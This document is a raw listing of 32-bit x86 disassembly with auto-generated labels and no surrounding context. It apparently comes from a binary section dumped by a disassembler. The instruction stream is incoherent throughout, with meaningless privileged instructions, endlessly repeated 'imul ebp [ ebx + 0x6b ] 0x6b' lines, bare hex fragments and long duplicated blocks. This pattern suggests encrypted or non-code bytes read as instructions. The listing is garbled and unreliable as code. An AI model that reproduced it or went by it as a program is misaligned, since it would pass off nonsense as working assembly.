imul ebp [ ebx - 0xc ] 0x7e
inc ebx
test eax 0x3bc8fbfb
adc dl ch
aam 0xfb
stosd [ edi ]
xchg ecx eax
mov [ eax + 0x25 ] esi
adc bl [ ebp - 0x2b ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x5d ] 0xffffff91
lahf
popfd
jb r-xdata
sti
imul esi esp 0x7c
add [ edx + 0x2a12fbfb ] edi
sar ebx 0x1
sti
imul ebp [ ebx - 0x63 ] 0x72
cmpsb [ esi ] [ edi ]
mov bh 0x70
and bl [ ebp + 0x70b5a672 ]
and al 0x9d
jb r-xdata
adc dl [ ecx ]
sar ebx cl
adc edx [ edx ]
sbb eax 0x6bfbfbd4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ edx + edx - 0x404119f ] 0x6b
hlt
sub_48022b
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
sti
sti
jbe r-xdata
adc esi [ esi + 0x76 ]
dec ebx
push es
add al 0x4
adc ch [ edx + esi * 8 ]
sti
sti
imul esi esp 0x7f
xchg ecx eax
retn 0xfbfb
sub al 0xf2
xor eax [ esi ]
add al 0x4
stosd [ edi ]
add al 0xad
lahf
adc bl [ edi + esi * 4 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x78 ] 0x3a
stc
lodsb [ esi ]
jo r-xdata
xor [ ebp - 0x5c940405 ] 0x404ca12
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffad
jo r-xdata
adc al [ ecx + 0x6bfbfbb5 ]
mov [ 0x404ca12 ] eax
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffff93
sti
jmp r-xdata
hlt
imul edx [ ebx - 0x4041405 ] 0x12
in al 0xfd
sti
sti
add al 0x8e
div [ eax - 0x42 ]
adc dl [ eax + 0x6bfbfbfb ]
jbe r-xdata
sub_4808e1
dec esp
cld
stosd [ edi ]
popfd
jo r-xdata
imul ebp [ ebx + 0x6b ] 0xffffff93
sti
jmp r-xdata
stc
popfd
clc
mov edi 0x4cf4dbdf
cmp ebp [ ebx + 0x54133d70 ]
imul edx [ ebx - 0x4041405 ] 0xffffffa8
adc dh [ 0x6b040404 ]
imul ebp [ ebx + 0x6b ] 0xffffff91
xor [ eax + 0x33 ] 0xffffff9d
jb r-xdata
ror [ ecx ] 0x1
div [ edx - 0x41 ]
fucomip st3
jle r-xdata
adc bl cl
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul eax [ esp + ebp * 2 ] 0x7b
sti
sti
sti
stosd [ edi ]
adc dl cl
fist [ edx ]

dec esp
int1
popfd
jb r-xdata
hlt
hlt
imul edx eax 0x9
in eax dx
adc al [ 0x7efbfbd6 ]
cmp esi esp
jg r-xdata
js r-xdata
add eax 0xbd700404
stosd [ edi ]
stosd [ edi ]
adc cl [ esi - 0x18 ]
sti
sti
js r-xdata
aam 0xfb
sti
js r-xdata
push esp
pop es
clc
hlt
mov dl 0xfb
sti
popfd
jb r-xdata
mov ecx 0x5ceea773
js r-xdata
mov ecx 0x5ceea773
add esp [ ebx - 0x44c51ee ]
sti
imul edx [ ebx ] 0xffffffe7
sti
sti
add al 0xbe
fcomi st4
jns r-xdata
sti
sti
js r-xdata
pop es
mov ebx 0xbe04fbfb
cmpsb [ esi ] [ edi ]
ror eax cl
and [ ebp + 0x12d1a672 ] bl
sbb al 0xc9
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
fstp st7
sti
adc dh [ 0x6bfbfbc6 ]
stosd [ edi ]
xchg ebx eax
sub_4809bd
xchg ebx eax
pop ecx
pop ebp
0x513ac10 0xfbc7
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffc0
cmp ah dh
jg r-xdata
sti
sti
sti
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x76
jle r-xdata
xor eax [ esi ]
add al 0x4
adc ecx [ ecx ]
cli
sti
sti
enter 0xbb3b 0x12
outsd
out dx eax
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ eax + ebp * 4 + 0x72bbad04 ] 0xffffffbe
xadd [ esp + esi * 8 ] bh
jg r-xdata
push es
add al 0x4
stosd [ edi ]
jbe r-xdata
adc dl [ ebx + 0x6b040405 ]
imul ebp [ ebx + 0x6b ] 0x6b
or eax 0xef913bc8
popfd
jb r-xdata
add al 0xab
xlat
das
jo r-xdata
dec edi
add eax [ esp + eax ]
stosd [ edi ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul eax eax 0x38
hlt
add edx [ edx ]
or al [ eax ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x78 ] 0x39
stc
popfd
jle r-xdata
sti
sti
xchg ecx eax
call [ edx ]
cwde
int1
sti
sti
xchg ecx eax
and [ ebx - 0x441a7ee ] 0xfffffffb
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ ebx + 0x69d106c3 ] 0xffffffac
jb r-xdata
adc bl [ edx + edx * 8 - 0x5 ]
sti
imul ebp [ ebx - 0xc ] 0x7e
lodsd [ esi ]
0xfbfb
xchg ecx eax
fist [ edx ]
clc
int3
imul edi ebx 0xfffffffb
sti
adc edx [ 0xffffffff93fbfbc0 ]
sbb al 0xfc
jpo r-xdata
jle r-xdata
pop edi
sti
sti
sti
adc esi [ edi ]
sar bl 0xfb
xchg ebx eax
in eax 0xd2
cmc
dec esp
lodsb [ esi ]
jb r-xdata
imul esi [ esi + 0x7e ] 0x33
hlt
lodsb [ esi ]
jb r-xdata
add edx [ edx ]
nop
salc
sti
sti
mov ebp 0xfbf16712
pop es
add al 0x4
stosd [ edi ]
jbe r-xdata
sti
imul ebp [ ebx + 0x6b ] 0x32
sti
imul esi [ edx - 0x7a ] 0x3
adc dl [ eax - 0x4204042a ]
adc ah [ edi - 0xf ]
sti
push ebx
sti
sti
sti
adc eax [ eax - 0x40 ]
sti
sti
js r-xdata
add al 0x6b
jpo r-xdata
outsd
sti
sti
sti
adc esp [ esi ]
sar bl 0xfb
xchg ebx eax
loopne r-xdata
popfd
jb r-xdata
sar bl cl
sti
ror [ edx ] 0x1
adc bh ah
stc
sti
sti
imul edx [ ebx ] 0xffffff92
mov ah 0xfb
sti
js r-xdata
sar ebx cl
sti
retn 0xf7b6
pop ss
push es
add al 0x4
mov ebx 0x3dca2893
lodsd [ esi ]
lodsb [ esi ]
jb r-xdata
imul eax [ ebx + ebp * 2 ] 0x7b
sti
sti
sti
jo r-xdata
iretd
stosd [ edi ]
cdq
lodsb [ esi ]
jb r-xdata
dec ebp
loope r-xdata
popfd
jle r-xdata
imul [ eax - 0x53fb066f ]
div [ eax + 0x23 ]
js r-xdata
stosd [ edi ]
adc dh [ esi ]
loop r-xdata
cmp [ ebx - 0xc ] ch
jle r-xdata
push edi
sti
sti
sti
adc cl bh
add al [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffac
add al 0xad
hlt
fnstsw [ ebx + 0x766bfbfb ]
jle r-xdata
stosd [ edi ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffff91
add al 0xab
xchg ecx eax
stc
xchg ebx eax
add esi [ edi ]
les esi [ edx - 0x4c0b3fc ]
sti
sti
adc ecx ecx
cld
sti
sti
js r-xdata
hlt
add al 0xad
mov bl 0x70
and edx [ edx ]
popad
int1
sti
sti
imul esi esp 0x4c
0x9deb729d 0x297e
add al 0x12
pop ebx
push cs
add al 0x4
imul ebp [ ebx + 0x3c ] 0xffffffbe
pop es
cli
sti
sti
sti
adc bl [ eax - 0x7 ]
sti
sti
stosd [ edi ]
adc bl [ ebx + 0x6bfbfbb1 ]
imul ebp [ ebx - 0x41eb2ee ] 0xfffffffb
sti
imul esi [ esi + 0x7e ] 0x13
adc bl ch
mov ebx 0x766bfbfb
mov esi 0x7004c80f
pop [ esi + 0x1f ]
enter 0x7032 0xa6
pshufw mm5 [ 0xfffffffffbf8ae12 ] 0xfb
imul esi esp 0x4c
mov ebp 0x3be04fd
adc dh [ esi ]
mov bh 0xfb
sti
imul ebp [ ebx + 0x6b ] 0x6b
adc ecx [ ecx + ecx * 8 + 0x3f78fbfb ]
out dx eax
add al 0x6c
adc edi ebx
sti
adc ebp [ edi ]
sti
sti
adc bl bh
adc cl [ ebp + 0xd ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
adc ebp [ ecx + 0x7efbfbc0 ]
cmp esi esp
jle r-xdata
sti
sti
sti
jbe r-xdata
adc cl [ ebp - 0x1f ]
sti
xor esi [ esi + 0x76 ]
dec ebx
push es
add al 0x4
adc eax edi
sar bl 0xfb
jle r-xdata
imul ebp [ ebx + 0x13 ] 0xffffff8c
leave
sti
sti
js r-xdata
hlt
jo r-xdata
out dx eax
adc bh [ edi + 0x6bfbfbe7 ]
imul ebp [ ebx + 0x6b ] 0x6b
stosd [ edi ]
adc dl [ esi - 0x3 ]
sti
sti
imul esp [ edx + 0x12fa0378 ] 0xffffffce
sti
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
mov [ 0x22708991 ] al
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ eax + esi * 2 - 0x4189147a ] 0x7
stosd [ edi ]
lodsb [ esi ]
add al 0x8e
imul [ eax + 0x12cfad04 ]
sar edi 0xfb
sti
adc dh [ edi + esi * 8 - 0x5 ]
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ esi - 0x42 ] 0x47
stosd [ edi ]
jo r-xdata
mov edi 0x6bfbfbe7
sti
adc bl cl
fnsave [ eax + 0x23 ]
adc dh [ edi ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x4ec93fc ] 0xfffffffb
sub_4812d7
push cs
add al 0x4
adc ah [ edi ]
mov ebp 0x6b6bfbfb
jbe r-xdata
jbe r-xdata
inc [ edx + 0x4 ]
add al 0xfb
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
ffreep st7
lodsb [ esi ]
stosd [ edi ]
adc eax [ ebp + 0x78fbfbb3 ]
aas
sti
sti
js r-xdata
add edi [ eax + edi * 8 ]
mov [ 0xffffffff9da2a2a2 ] eax
shr [ edx ] 0xf4
jg r-xdata
mov esi 0x8b829337
sahf
cmp al 0xbe
sub ecx [ ecx + 0x13dbdb8d ]
mov eax 0xa404040f
movsd [ edi ] [ esi ]
mov al [ 0xfffffffffbcc0412 ]
sti
hlt
add edi eax
mov dh 0x7
stosd [ edi ]
adc al [ esi ]
or [ esp + eax ] eax
imul ecx eax 0x3b
mov ebx 0x6b6b3832
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
cmpsd [ esi ] [ edi ]

or eax 0x6f120404
int 0xfb
sti
popfd
jb r-xdata
hlt
test edx 0x12dbdf87
cmpsd [ esi ] [ edi ]
pop es
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xfffffff4
jle r-xdata
and [ ebp + 0x1213a672 ] bl
sti
sti
sti
jbe r-xdata
sti
sti
popfd
pop es
jb r-xdata
pop ds
pop ss
mov [ 0xffffffffa4128d91 ] eax
fdiv st3
sti
popfd
jb r-xdata
sti
jmp r-xdata
shl [ esp + esi * 8 ] 0x7f
jg r-xdata
add edx [ edx ]
sub eax 0x6bfbfbc3
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x78
aas
not [ ecx - 0x20408915 ]
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
mov esi 0x1fbe7207
out 0xf7 al
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
sbb eax 0x729d20c8
cmpsb [ esi ] [ edi ]
adc edx [ edx ]
jb r-xdata
dec esp
int1
inc esp
mov eax [ 0xffffffff9dfbfb8c ]
mov bl 0xf9
adc [ ebx + 0x6d128f91 ] esp
jbe r-xdata
0x8f72
sti
jb r-xdata
add al 0x4
sti
nop
cmp edi esi
nop
xor bh dh
inc ecx
add al 0xee
sti
sti
popfd
jb r-xdata
stc
sub_481320
popfd
shr [ edx ] 0xf4
jmp r-xdata
add al 0x4
add al 0x70
cmpsb [ esi ] [ edi ]
add esi esp
dec esp
mov esi 0xf9b376eb
stosb [ edi ]
js r-xdata
jbe r-xdata
0x8f72
jle r-xdata
pop es
sti
adc ch [ eax - 0xe ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
adc esi [ ecx - 0x37 ]
sti
sti
adc bl cl
cld
sti
sti
imul esi esp 0x4c
mov eax 0x709dab9f
mov eax 0xbff89dd5
fstp st7
adc ch [ esi + 0x6bfbfbdf ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x55 ] 0x4
lodsd [ esi ]
shl [ esi + 0x7e ] cl
xor eax [ esi ]
add al 0x4
stosd [ edi ]
add al 0xad
lahf
enter 0x7832 0x3
add al 0xf4
outsb
cmp dh [ eax + 0x2 ]
adc dl [ ebx ]
add eax [ esp + eax ]
mov [ 0xfffffffffbdd9c13 ] al
sti
js r-xdata
add al 0x4
sti
sti
jb r-xdata
nop
cmp edi esi
nop
xor bh dh
inc ecx
add al 0xee
sti
sti
popfd
jb r-xdata
stc
push cs
fdiv st3
sti
enter 0xc204 0x87
fxch st7
hlt
cli
hlt
sti
sti
js r-xdata
add edi [ eax + edi * 8 ]
mov [ 0xffffffff9da2a2a2 ] eax
shr [ edx ] 0xf4
jg r-xdata
hlt
test edx 0x12dbdf87
cmpsd [ esi ] [ edi ]
pop es
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xfffffff4
jle r-xdata
and [ ebp + 0x1213a672 ] bl
sti
sti
sti
jbe r-xdata
cmpsd [ esi ] [ edi ]

or eax 0x6f120404
int 0xfb
sti
popfd
jb r-xdata
sti
jmp r-xdata
pop ds
sti
popfd
jb r-xdata
pop ss
mov [ 0xffffffffa4128d91 ] eax
fdiv st3
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
mov esi 0x1fbe7207
out 0xf7 al
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
sbb eax 0x729d20c8
cmpsb [ esi ] [ edi ]
adc edx [ edx ]
jb r-xdata
jg r-xdata
add edx [ edx ]
sub eax 0x6bfbfbc3
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x78
aas
not [ ecx - 0x20408915 ]
mov bl 0xf9
adc [ ebx + 0x6d128f91 ] esp
dec esp
int1
inc esp
mov eax [ 0xffffffff9dfbfb8c ]
shl [ esp + esi * 8 ] 0x7f
sub_481450
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x5e ] 0x12
xor eax 0x2804040f
add [ edx ] dl
or [ edi ] cl
add al 0x4
xchg ecx eax
lodsd [ esi ]
jo r-xdata
imul ebp [ ebx + 0x72 ] 0xffffffbd
fist [ ebx ]
mov ch 0xc9
sti
sti
xchg ebx eax
mov esi 0xac4b5ecb
jb r-xdata
adc ah [ ecx - 0x6 ]
sti
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jbe r-xdata
not [ ebx ]
mov ebx 0x93fbfbc9
popfd
jb r-xdata
xor eax [ esi ]
add al 0x4
stosd [ edi ]
adc bh [ edx ]
add al 0xab
jmp r-xdata
mov dl 0x70
sub [ ebp - 0x54 ] ah
jb r-xdata
mov ebp 0xc9bb13f7
sti
sti
xchg ebx eax
and esp [ edx + 0x729d9c91 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x7e ] 0x3b
hlt
dec ebx
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
pop ds
enter 0x913b 0x83
popfd
jb r-xdata
adc dl [ edx ]
out dx eax
sti
sti
imul ebp [ ebx + 0x6b ] 0xfffffff8
cmp [ ebx + ecx * 2 ] al
imul edi [ esi + 0x3b ] 0xfffffff4
sbb eax 0xfbfeae12
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0x3d ] 0xffffff9d
jb r-xdata
inc edi
popfd
jb r-xdata
jg r-xdata
cmp ebx [ ebp - 0x62ce798e ]
jb r-xdata
mov dh 0x21
mov [ 0x729dd591 ] al
mov dh 0x27
mov [ 0x25b6729d ] al
jo r-xdata
mov [ 0x729d8391 ] al
mov dh 0x2d
mov [ 0x729d9a91 ] al
mov dh 0x23
mov [ 0x729d9c91 ] al
aaa
sub_481490
leave
leave
jb r-xdata
mov ebx 0x4089f12
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jle r-xdata
sti
sti
js r-xdata
mov ebp 0xc9c913eb
daa
sbb [ ebp + 0x121dbe72 ] 0xffffffae
hlt
dec ebx
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
pop ds
enter 0x913b 0x83
popfd
jb r-xdata
adc dl [ edx ]
out dx eax
sti
sti
imul ebp [ ebx + 0x6b ] 0xfffffff8
cmp [ ebx + ecx * 2 ] al
imul edi [ esi + 0x3b ] 0xfffffff4
sbb eax 0xfbfeae12
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0x3d ] 0xffffff9d
jb r-xdata
inc edi
popfd
jb r-xdata
jg r-xdata
cmp ebx [ ebp - 0x62ce798e ]
jb r-xdata
mov [ 0x25b6729d ] al
jo r-xdata
mov [ 0x729d8391 ] al
mov dh 0x2d
mov [ 0x729d9a91 ] al
mov dh 0x23
mov [ 0x729d9c91 ] al
mov dh 0x21
mov [ 0x729dd591 ] al
mov dh 0x27
aaa
sub_4814af
sti
sti
xchg ecx eax
call [ edx ]
cmp ebx ebp
sti
sti
popfd
jb r-xdata
mov ebp 0xc9b513df
sti
sti
xchg ebx eax
mov esi 0xac4b5ecb
jb r-xdata
das
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jbe r-xdata
not [ ebx ]
mov ebx 0x93fbfbc9
dec ebx
popfd
jb r-xdata
popfd
jb r-xdata
xor eax [ esi ]
add al 0x4
stosd [ edi ]
adc bh [ edx ]
add al 0xab
jmp r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
pop ds
enter 0x913b 0x83
popfd
jb r-xdata
mov dl 0x70
sub [ ebp - 0x54 ] ah
jb r-xdata
mov ebp 0xc9bb13f7
sti
sti
xchg ebx eax
mov dh 0x21
mov [ 0x729dd591 ] al
mov dh 0x27
mov [ 0x25b6729d ] al
jo r-xdata
and esp [ edx + 0x729d9c91 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x7e ] 0x3b
hlt
adc dl [ edx ]
out dx eax
sti
sti
imul ebp [ ebx + 0x6b ] 0xfffffff8
cmp [ ebx + ecx * 2 ] al
imul edi [ esi + 0x3b ] 0xfffffff4
sbb eax 0xfbfeae12
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0x3d ] 0xffffff9d
jb r-xdata
inc edi
popfd
jb r-xdata
jg r-xdata
cmp ebx [ ebp - 0x62ce798e ]
jb r-xdata
mov [ 0x729d8391 ] al
mov dh 0x2d
mov [ 0x729d9a91 ] al
mov dh 0x23
mov [ 0x729d9c91 ] al
aaa
sub_481520
sti
sti
stosd [ edi ]
lodsb [ esi ]
adc ah [ edx + ebx * 8 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x13
dec edx
or eax 0x33700404
adc ecx [ ecx - 0x57040402 ]
jbe r-xdata
imul ebp [ ebx + 0x32 ] 0x38
imul ebp [ ebx + 0x6b ] 0x6b
mov [ 0xffffffff82123b7e ] al
fdivr st3
sti
hlt
push edi
or eax 0x4ab0404
lodsd [ esi ]

sub_481893
add al 0x4
adc esi [ ebx ]
push ss
add al 0x4
jle r-xdata
js r-xdata
hlt
adc edx [ edx - 0x2a ]
sti
sti
js r-xdata
jecxz r-xdata
ja r-xdata
jmp r-xdata
sti
mov esi 0x7e76ab4b
lahf
add al 0x4
add al 0xab
lodsd [ esi ]
adc cl [ edi - 0xb040434 ]
jg r-xdata
lodsd [ esi ]
lodsb [ esi ]
xchg ecx eax
0xa28d91a1 0x9c91
jo r-xdata
add al 0x4
adc ah al
out 0xfb al
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x78
pop ss
fwait
test al 0xad
mov [ 0x729d9891 ] eax
xchg ecx eax
mov [ ebp - 0x5cdc418e ] bl
xchg ecx eax
push es
jmp r-xdata
adc eax 0x91a80404
test bl dh
sti
hlt
popfd
jb r-xdata
adc esi [ edi + 0x16 ]
daa
mov [ 0xffffffff8112d591 ] eax
jbe r-xdata
jb r-xdata
and [ eax + 0x3a ] esi
popfd
dec ebx
inc ebp
mov al 0x77
add al 0x4c
aas
sti
sti
sti
adc esi [ edi + 0x1 ]
add al 0x4
call [ edx ]
push edx
loopne r-xdata
sti
imul esi [ edx ] 0x38
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx + 0x65 ] 0x37
sti
sti
sti
adc eax [ ecx - 0x2a ]
sti
sti
xchg ebx eax
adc [ edx + 0x11 ] edi
inc ecx
test al 0x72
jge r-xdata
inc ecx
das
jo r-xdata
jo r-xdata
add al 0x4
xor eax [ esi ]
imul ebp [ ebx + 0x7a ] 0x17
lahf
int1
sti
sti
test al 0xad
lodsb [ esi ]
jo r-xdata
sti
sti
sti
cwde
popfd
jb r-xdata
leave
sti
sti
adc cl [ edx + 0x6bfbfbf2 ]
imul ebp [ ebx + 0x76 ] 0x76
sti
sti
jo r-xdata
popfd
jb r-xdata
sti
adc ebp [ 0xffffffffa2040400 ]
add ah dh
jg r-xdata
enter 0xc020 0x0
hlt
adc ebx [ edi ]
or al [ esp + eax ]
adc edx [ ecx + 0x4040410 ]
hlt
sub eax 0x9d8891a3
jb r-xdata
jo r-xdata
add al 0x4
add al 0xad
stosd [ edi ]
adc dh [ esi - 0x20 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
not [ edx ]
xor ah 0xfb
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffae
jo r-xdata
leave
sti
sti
shl [ eax ] 0xf4
jg r-xdata
imul edi [ eax - 0x79 ] 0xffffffdf
not [ ebx ]
inc edx
aad 0xfb
sti
imul ebp [ ebx + 0x6b ] 0x76
jbe r-xdata
mov dh dl
sti
mov esi 0x9d3a7021
and esp [ ebx + 0x729d9891 ]
jo r-xdata
sbb esp [ edx - 0x54ec418a ]
jo r-xdata
sti
sti
jpe r-xdata
popfd
jb r-xdata
stosd [ edi ]
add al 0x8e
adc ecx ebp
stc
sti
sti
jbe r-xdata
in al dx
sti
adc ecx ebp
sbb [ ebx ] edx
test eax 0xa2040400
jle r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
js r-xdata
add eax [ esi ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ ebx - 0x4048405 ] 0x12
or al 0x9
add al 0x4
imul ebp [ ebx + 0x6b ] 0x7e
xor dh ah
jg r-xdata
hlt
mov ebp 0x267ff4fb
or [ esp + eax ] al
js r-xdata
and [ ebp + 0x7005a672 ] bl
and [ ebp - 0x6ea4598e ] ebx
mov [ eax + 0x22 ] dh
popfd
jb r-xdata
mov [ 0x6b3832a2 ] al
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x4
dec esp
aas
sti
sti
sti
adc bh [ edx ]
salc
sti
sti
add al 0x6c
pop edi
sti
sti
sti
enter 0xa53b 0xa0
adc ah [ esi + 0x7604040a ]
jle r-xdata
fucomip st7
sti
adc dh [ esi ]
or [ esp + eax ] al
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
inc edi
pop ecx
adc dh [ edi + 0x6bfbfbe1 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
pop ss
adc ah [ ecx - 0x40 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x63 ] 0x72
mov ss [ edi + 0x70 ]
sub_4818bd
pop ss
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffff93
adc edx [ edx - 0x2a ]
sti
sti
js r-xdata
jecxz r-xdata
ja r-xdata
jmp r-xdata
sti
mov esi 0x7e76ab4b
lahf
add al 0x4
add al 0xab
lodsd [ esi ]
adc cl [ edi - 0xb040434 ]
jg r-xdata
lodsd [ esi ]
lodsb [ esi ]
xchg ecx eax
0xa28d91a1 0x9c91
jo r-xdata
add al 0x4
adc ah al
out 0xfb al
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x78
pop ss
fwait
test al 0xad
mov [ 0x729d9891 ] eax
xchg ecx eax
mov [ ebp - 0x5cdc418e ] bl
xchg ecx eax
push es
jmp r-xdata
adc eax 0x91a80404
test bl dh
sti
hlt
popfd
jb r-xdata
adc esi [ edi + 0x16 ]
daa
mov [ 0xffffffff8112d591 ] eax
jbe r-xdata
jb r-xdata
and [ eax + 0x3a ] esi
popfd
dec ebx
inc ebp
mov al 0x77
add al 0x4c
aas
sti
sti
sti
adc esi [ edi + 0x1 ]
add al 0x4
js r-xdata
call [ edx ]
push edx
loopne r-xdata
sti
imul esi [ edx ] 0x38
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx + 0x65 ] 0x37
sti
sti
sti
adc eax [ ecx - 0x2a ]
sti
sti
xchg ebx eax
adc [ edx + 0x11 ] edi
inc ecx
test al 0x72
jge r-xdata
inc ecx
das
jo r-xdata
jo r-xdata
add al 0x4
xor eax [ esi ]
imul ebp [ ebx + 0x7a ] 0x17
lahf
int1
sti
sti
test al 0xad
lodsb [ esi ]
jo r-xdata
sti
sti
sti
cwde
popfd
jb r-xdata
leave
sti
sti
adc cl [ edx + 0x6bfbfbf2 ]
imul ebp [ ebx + 0x76 ] 0x76
sti
sti
jo r-xdata
popfd
jb r-xdata
sti
adc ebp [ 0xffffffffa2040400 ]
add ah dh
jg r-xdata
enter 0xc020 0x0
hlt
adc ebx [ edi ]
or al [ esp + eax ]
adc edx [ ecx + 0x4040410 ]
hlt
sub eax 0x9d8891a3
jb r-xdata
jo r-xdata
add al 0x4
add al 0xad
stosd [ edi ]
adc dh [ esi - 0x20 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
not [ edx ]
xor ah 0xfb
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffae
jo r-xdata
leave
sti
sti
shl [ eax ] 0xf4
jg r-xdata
imul edi [ eax - 0x79 ] 0xffffffdf
not [ ebx ]
inc edx
aad 0xfb
sti
imul ebp [ ebx + 0x6b ] 0x76
jbe r-xdata
mov dh dl
sti
mov esi 0x9d3a7021
and esp [ ebx + 0x729d9891 ]
jo r-xdata
sbb esp [ edx - 0x54ec418a ]
jo r-xdata
sti
sti
jpe r-xdata
popfd
jb r-xdata
stosd [ edi ]
add al 0x8e
adc ecx ebp
stc
sti
sti
jbe r-xdata
in al dx
sti
adc ecx ebp
sbb [ ebx ] edx
test eax 0xa2040400
jle r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
js r-xdata
